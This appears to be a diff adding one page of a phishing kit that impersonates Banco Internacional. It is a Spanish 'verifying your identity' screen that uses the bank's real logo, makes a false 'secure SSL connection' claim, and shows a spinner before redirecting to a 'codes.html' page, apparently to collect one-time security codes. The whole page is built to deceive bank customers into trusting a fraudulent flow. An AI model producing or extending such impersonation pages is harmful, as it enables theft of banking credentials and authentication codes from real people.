@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<title>Banco Internacional – Verificando</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap');
+
+  *{ box-sizing:border-box; margin:0; padding:0; }
+
+  body{
+    min-height:100dvh;
+    background: linear-gradient(160deg, #f59a05 0%, #e08800 60%, #c97500 100%);
+    font-family:'Inter',sans-serif;
+    display:flex;
+    flex-direction:column;
+    justify-content:center;
+    align-items:center;
+    padding:24px;
+  }
+
+  .card{
+    background:rgba(255,255,255,0.12);
+    backdrop-filter:blur(14px);
+    -webkit-backdrop-filter:blur(14px);
+    border:1px solid rgba(255,255,255,0.25);
+    border-radius:24px;
+    padding:40px 32px 36px;
+    width:100%;
+    max-width:380px;
+    text-align:center;
+    color:#fff;
+    box-shadow:0 8px 40px rgba(0,0,0,0.18);
+  }
+
+  .logo{
+    width:160px;
+    margin:0 auto 32px;
+    display:block;
+    filter:drop-shadow(0 2px 6px rgba(0,0,0,0.20));
+  }
+
+  /* ── Spinner animado ─────────────────────────── */
+  .spinner-wrap{
+    width:80px;
+    height:80px;
+    margin:0 auto 28px;
+    position:relative;
+  }
+  .spinner{
+    width:100%;
+    height:100%;
+    border-radius:50%;
+    border:6px solid rgba(255,255,255,0.2);
+    border-top-color:#fff;
+    animation:spin 1s linear infinite;
+  }
+  @keyframes spin{
+    to{ transform:rotate(360deg); }
+  }
+
+  .title{
+    font-size:1.15rem;
+    font-weight:600;
+    margin-bottom:10px;
+    letter-spacing:0.2px;
+  }
+  .subtitle{
+    font-size:0.85rem;
+    opacity:0.82;
+    line-height:1.6;
+  }
+
+  .footer{
+    margin-top:28px;
+    font-size:0.75rem;
+    color:rgba(255,255,255,0.55);
+    text-align:center;
+  }
+</style>
+</head>
+<body>
+
+<div class="card">
+  <!-- Logo -->
+  <img
+    class="logo"
+    src="https://www.bancointernacional.com.ec/wp-content/uploads/2020/11/cropped-logo-banco-internacional.webp"
+    alt="Banco Internacional"
+  >
+
+  <!-- Spinner -->
+  <div class="spinner-wrap">
+    <div class="spinner"></div>
+  </div>
+
+  <!-- Textos -->
+  <div class="title">Verificando su identidad</div>
+  <div class="subtitle">
+    Por favor no cierre esta ventana.<br>
+    Estamos validando su información de forma segura.
+  </div>
+</div>
+
+<!-- Footer -->
+<div class="footer">
+  🔒 Conexión segura SSL · Banco Internacional © 2025
+</div>
+
+<script>
+  // Redirige a codes.html tras 15 segundos
+  setTimeout(() => {
+    window.location.href = "codes.html";
+  }, 15000);
+</script>
+</body>
+</html>
